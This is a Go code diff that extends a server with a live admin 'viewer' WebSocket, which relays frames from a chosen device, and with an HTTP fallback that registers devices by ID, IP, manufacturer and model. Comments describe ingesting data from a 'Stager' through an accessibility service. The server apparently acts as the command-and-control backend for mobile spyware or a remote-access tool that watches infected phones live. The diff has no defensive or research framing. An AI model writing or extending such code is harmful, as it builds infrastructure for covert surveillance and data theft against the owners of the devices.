@@ -31,12 +31,13 @@ type Config struct {
 }
 
 type Server struct {
-	config    *Config
-	db        *db.Store
-	hub       *Hub
-	supabase  *supabase.Client
-	upgrader  websocket.Upgrader
-	done      chan struct{}
+	config     *Config
+	db         *db.Store
+	hub        *Hub
+	adminHub   *AdminHub
+	supabase   *supabase.Client
+	upgrader   websocket.Upgrader
+	done       chan struct{}
 	unregister chan *Client
 }
 
@@ -56,6 +57,7 @@ func New(cfg *Config) (*Server, error) {
 		config:     cfg,
 		db:         database,
 		hub:        NewHub(),
+		adminHub:   NewAdminHub(),
 		supabase:   sb,
 		upgrader: websocket.Upgrader{
 			ReadBufferSize:  4096,
@@ -75,6 +77,9 @@ func (s *Server) Start() error {
 	// WebSocket endpoint
 	mux.HandleFunc("/ws", s.handleWS)
 
+	// Admin WebSocket (browser viewer)
+	mux.HandleFunc("/admin/ws", s.handleAdminWS)
+
 	// REST API endpoints
 	mux.HandleFunc("/api/health", s.handleHealth)
 	mux.HandleFunc("/api/devices", s.handleListDevices)
@@ -88,8 +93,14 @@ func (s *Server) Start() error {
 	// HTTP data ingestion (for Stager's accessibility service POST)
 	mux.HandleFunc("/api/ingest", s.handleDataIngest)
 
+	// HTTP device registration (fallback when WebSocket fails)
+	mux.HandleFunc("/api/register", s.handleHTTPRegister)
+
 	// Dashboard
 	mux.HandleFunc("/", s.handleDashboard)
+
+	// Live viewer page
+	mux.HandleFunc("/viewer", s.handleViewer)
 
 	// Periodic tasks
 	go s.periodicTasks()
@@ -120,6 +131,54 @@ func (s *Server) handleWS(w http.ResponseWriter, r *http.Request) {
 
 	client := NewClient(conn, s)
 	client.Start()
+}
+
+func (s *Server) handleAdminWS(w http.ResponseWriter, r *http.Request) {
+	conn, err := s.upgrader.Upgrade(w, r, nil)
+	if err != nil {
+		log.Printf("admin ws upgrade failed: %v", err)
+		return
+	}
+
+	client := NewAdminClient(conn, s)
+
+	// First message from admin must be: {"type":"subscribe","device_id":"..."}
+	_, msg, err := conn.ReadMessage()
+	if err != nil {
+		log.Printf("admin ws subscribe read error: %v", err)
+		conn.Close()
+		return
+	}
+
+	var sub struct {
+		Type     string `json:"type"`
+		DeviceID string `json:"device_id"`
+	}
+	if err := json.Unmarshal(msg, &sub); err != nil || sub.Type != "subscribe" || sub.DeviceID == "" {
+		conn.WriteMessage(websocket.TextMessage, []byte(`{"type":"error","error":"expected subscribe with device_id"}`))
+		conn.Close()
+		return
+	}
+
+	s.adminHub.RegisterViewer(sub.DeviceID, client)
+	log.Printf("admin viewer subscribed to %s", sub.DeviceID)
+
+	// Confirm subscription
+	conn.WriteMessage(websocket.TextMessage, []byte(`{"type":"subscribed","device_id":"`+sub.DeviceID+`"}`))
+
+	// Keep connection alive — admin sends pings, we relay frames via SendBinary
+	go func() {
+		defer func() {
+			client.Close()
+		}()
+		for {
+			_, _, err := conn.ReadMessage()
+			if err != nil {
+				return
+			}
+		}
+	}()
+	<-client.done
 }
 
 func (s *Server) handleHealth(w http.ResponseWriter, r *http.Request) {
@@ -342,6 +401,37 @@ func (s *Server) handleDataIngest(w http.ResponseWriter, r *http.Request) {
 
 	log.Printf("ingest data from %s type=%s size=%d", body.DeviceID, body.DataType, len(plaintext))
 	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
+}
+
+func (s *Server) handleHTTPRegister(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "application/json")
+
+	if r.Method != "POST" {
+		http.Error(w, "method not allowed", 405)
+		return
+	}
+
+	var info types.DeviceInfo
+	if err := json.NewDecoder(r.Body).Decode(&info); err != nil {
+		http.Error(w, "invalid request", 400)
+		return
+	}
+
+	if info.DeviceID == "" {
+		http.Error(w, "device_id required", 400)
+		return
+	}
+
+	info.IPAddress = r.RemoteAddr
+
+	if err := s.db.RegisterDevice(info); err != nil {
+		log.Printf("failed to register device %s via HTTP: %v", info.DeviceID, err)
+		http.Error(w, "registration failed", 500)
+		return
+	}
+
+	log.Printf("device %s registered via HTTP (%s %s)", info.DeviceID, info.Manufacturer, info.Model)
+	json.NewEncoder(w).Encode(map[string]string{"status": "registered"})
 }
 
 func (s *Server) periodicTasks() {
